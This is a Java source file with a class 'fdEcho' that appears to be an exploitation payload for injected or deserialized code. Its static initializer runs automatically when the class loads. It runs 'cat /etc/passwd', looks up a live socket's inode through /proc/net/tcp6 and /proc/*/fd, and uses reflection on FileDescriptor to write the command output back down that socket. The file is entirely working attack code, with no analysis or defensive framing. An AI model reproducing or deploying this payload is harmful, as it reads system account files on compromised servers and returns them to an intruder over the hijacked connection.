package java;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;

public class fdEcho {
    public static String exec(String cmd) {
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            InputStream fis = process.getInputStream();
            InputStreamReader isr = new InputStreamReader(fis);
            BufferedReader br = new BufferedReader(isr);
            String line = null;
            StringBuilder builder = new StringBuilder();
            while ((line = br.readLine()) != null) {
                builder.append(line);
            }
            return builder.toString();
        } catch (Exception ignore) {
        }
        return "";
    }

    public static String ipToHex(String ip) {
        StringBuilder sb = new StringBuilder();
        String[] data = ip.split("\\.");
        int temp;
        for (int i = 0; i < 4; i++) {
            temp = Integer.parseInt(data[i]);
            sb.insert(0, String.format("%02x", temp).toUpperCase());
        }
        return sb.toString();
    }

    static {
        try {
            String hex = ipToHex("127.0.0.1");
            String cmd = "cat /etc/passwd";
            String result = exec(cmd);
            String inode = exec(String.format("cat /proc/net/tcp6 | awk '$3 ~/%s/{print $10}'", hex));
            for (String i : inode.split("\n")) {
                String res2 = exec(String.format("ls -al /proc/*/fd | awk '$11 ~/%s/{print $9}'", i));
                int num = Integer.parseInt(res2.replaceAll("\\s", ""));
                FileDescriptor fd = new FileDescriptor();
                Field field = fd.getClass().getDeclaredField("fd");
                field.setAccessible(true);
                field.set(fd, num);
                FileOutputStream fout = new FileOutputStream(fd);
                fout.write(result.getBytes(StandardCharsets.UTF_8));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}